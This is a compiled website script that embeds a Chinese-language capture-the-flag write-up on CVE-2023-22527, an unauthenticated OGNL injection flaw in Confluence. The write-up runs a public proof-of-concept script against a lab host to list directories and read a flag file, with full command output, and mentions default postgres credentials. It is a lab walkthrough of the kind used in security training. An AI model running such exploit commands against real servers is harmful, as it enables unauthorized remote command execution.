"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[78915],{20449:(r,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>p,frontMatter:()=>i,metadata:()=>e,toc:()=>d});const e=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2023-22527/index","title":"CVE-2023-22527","description":"\u5728 Confluence 8.0 \u5230 8.5.3 \u7248\u672c\u4e4b\u95f4\uff0c\u5b58\u5728\u4e00\u5904\u7531\u4e8e\u4efb\u610f velocity \u6a21\u677f\u88ab\u8c03\u7528\u5bfc\u81f4\u7684 OGNL \u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u672a\u6388\u6743\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u76f4\u63a5\u653b\u51fb Confluence \u670d\u52a1\u5668\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4","source":"@site/docs/Independent-Environment/CVE/CVE-2023-22527/index.md","sourceDirName":"Independent-Environment/CVE/CVE-2023-22527","slug":"/Independent-Environment/CVE/CVE-2023-22527/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2023-22527/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2023-22527/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2023-1773","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2023-1773/"},"next":{"title":"CVE-2023-27178","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2023-27178/"}}');var o=t(74848),a=t(28453);const i={},s="CVE-2023-22527",c={},d=[];function x(r){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...r.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"cve-2023-22527",children:"CVE-2023-22527"})}),"\n",(0,o.jsx)(n.admonition,{type:"info",children:(0,o.jsxs)(n.blockquote,{children:["\n",(0,o.jsx)(n.p,{children:"\u5728 Confluence 8.0 \u5230 8.5.3 \u7248\u672c\u4e4b\u95f4\uff0c\u5b58\u5728\u4e00\u5904\u7531\u4e8e\u4efb\u610f velocity \u6a21\u677f\u88ab\u8c03\u7528\u5bfc\u81f4\u7684 OGNL \u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u672a\u6388\u6743\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u76f4\u63a5\u653b\u51fb Confluence \u670d\u52a1\u5668\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4"}),"\n"]})}),"\n",(0,o.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,o.jsx)(n.a,{href:"https://github.com/Manh130902/CVE-2023-22527-POC",children:"Manh130902/CVE-2023-22527-POC: A critical severity Remote Code Execution (RCE) vulnerability (CVE-2023-22527) was discovered in Confluence Server and Data Center."})," \u76f4\u63a5\u68ad\u54c8"]}),"\n",(0,o.jsx)(n.admonition,{type:"warning",children:(0,o.jsx)(n.p,{children:"\u670d\u52a1\u542f\u52a8\u65f6\u95f4\u8f83\u957f"})}),"\n",(0,o.jsx)(n.p,{children:"\u751f\u6210\u4e00\u4e2a\u8bd5\u7528\u8bb8\u53ef\u8bc1"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:t(93695).A+"",width:"2560",height:"1371"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:t(49496).A+"",width:"2560",height:"1371"})}),"\n",(0,o.jsxs)(n.p,{children:["\u6570\u636e\u5e93\u8fd9\u91cc\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684 ",(0,o.jsx)(n.code,{children:"postgres:postgres"})," \u51ed\u636e\u8fde\u63a5\u6570\u636e\u5e93"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"img",src:t(24260).A+"",width:"2560",height:"1371"})}),"\n",(0,o.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u914d\u7f6e\u5b8c\u73af\u5883\u521d\u59cb\u5316\u4e4b\u540e\uff0c\u5373\u53ef\u653b\u51fb\u73af\u5883"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-22527-POC]\n\u2514\u2500$ python3 CVE-2023-22527.py --target http://6bda12f1-fa21-45f4-83f5-b83190f9abca-488.cyberstrikelab.com:83/ --cmd "pwd"\nConfluence version: 8.5.3\nCommand Output:\n/var/atlassian/application-data/confluence\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-22527-POC]\n\u2514\u2500$ python3 CVE-2023-22527.py --target http://6bda12f1-fa21-45f4-83f5-b83190f9abca-488.cyberstrikelab.com:83/ --cmd "ls -lh /"\nConfluence version: 8.5.3\nCommand Output:\ntotal 24K lrwxrwxrwx    1 root root    7 Jan 11  2024 bin -> usr/bin drwxr-xr-x    2 root root   10 Apr 18  2022 boot -rwxrwxr-x    1 root root 1.2K Jan 17  2024 __cacert_entrypoint.sh drwxr-xr-x    5 root root  360 Apr 23 15:03 dev -rw-r--r--    1 root root 5.5K Jan 20  2024 entrypoint_helpers.py -rwxr-xr-x    1 root root  995 Jan 20  2024 entrypoint.py drwxr-xr-x    1 root root   66 Apr 23 15:03 etc -rwxr-xr-x    1 root root  143 Dec  3 07:24 flag.sh drwxr-xr-x    2 root root   10 Apr 18  2022 home lrwxrwxrwx    1 root root    7 Jan 11  2024 lib -> usr/lib lrwxrwxrwx    1 root root    9 Jan 11  2024 lib32 -> usr/lib32 lrwxrwxrwx    1 root root    9 Jan 11  2024 lib64 -> usr/lib64 lrwxrwxrwx    1 root root   10 Jan 11  2024 libx32 -> usr/libx32 drwxr-xr-x    2 root root   10 Jan 11  2024 media drwxr-xr-x    2 root root   10 Jan 11  2024 mnt drwxr-xr-x    1 root root   31 Jan 20  2024 opt dr-xr-xr-x 4295 root root    0 Apr 23 15:03 proc drwx------    1 root root   10 Jan 17  2024 root drwxr-xr-x    1 root root   29 Apr 23 15:03 run lrwxrwxrwx    1 root root    8 Jan 11  2024 sbin -> usr/sbin drwxr-xr-x    1 root root   35 Jan 20  2024 sbom -rwxr-xr-x    1 root root 1.1K Jan 20  2024 shutdown-wait.sh drwxr-xr-x    2 root root   10 Jan 11  2024 srv dr-xr-xr-x   13 root root    0 Apr 23 15:03 sys drwxrwxrwt    1 root root   63 Apr 23 15:03 tmp drwxr-xr-x    1 root root   90 Jan 11  2024 usr drwxr-xr-x    1 root root   46 Jan 20  2024 var\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-22527-POC]\n\u2514\u2500$ python3 CVE-2023-22527.py --target http://6bda12f1-fa21-45f4-83f5-b83190f9abca-488.cyberstrikelab.com:83/ --cmd "ls -lh /tmp"\nConfluence version: 8.5.3\nCommand Output:\ntotal 4.0K -rw-r--r-- 1 root       root       46 Apr 23 15:03 flag.txt drwxr-xr-x 2 confluence confluence 39 Apr 23 15:16 hsperfdata_confluence drwxr-xr-x 1 root       root       24 Jan 17  2024 hsperfdata_root\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-22527-POC]\n\u2514\u2500$ python3 CVE-2023-22527.py --target http://6bda12f1-fa21-45f4-83f5-b83190f9abca-488.cyberstrikelab.com:83/ --cmd "cat /tmp/flag.txt"\nConfluence version: 8.5.3\nCommand Output:\ngo-flag{b3921870-be0b-48b1-9672-a7da35c98653}\n'})})]})}function p(r={}){const{wrapper:n}={...(0,a.R)(),...r.components};return n?(0,o.jsx)(n,{...r,children:(0,o.jsx)(x,{...r})}):x(r)}},93695:(r,n,t)=>{t.d(n,{A:()=>e});const e=t.p+"assets/images/image_20250455-225541-021d94696d41c2823f1d8cc57e7ee52f.png"},49496:(r,n,t)=>{t.d(n,{A:()=>e});const e=t.p+"assets/images/image_20250456-225648-c4475f66df048ba982cb88b356808b0d.png"},24260:(r,n,t)=>{t.d(n,{A:()=>e});const e=t.p+"assets/images/image_20250459-225937-1505352adb2caa5487040e18b87896ac.png"},28453:(r,n,t)=>{t.d(n,{R:()=>i,x:()=>s});var e=t(96540);const o={},a=e.createContext(o);function i(r){const n=e.useContext(a);return e.useMemo((function(){return"function"==typeof r?r(n):{...n,...r}}),[n,r])}function s(r){let n;return n=r.disableParentContext?"function"==typeof r.components?r.components(o):r.components||o:i(r.components),e.createElement(a.Provider,{value:n},r.children)}}}]);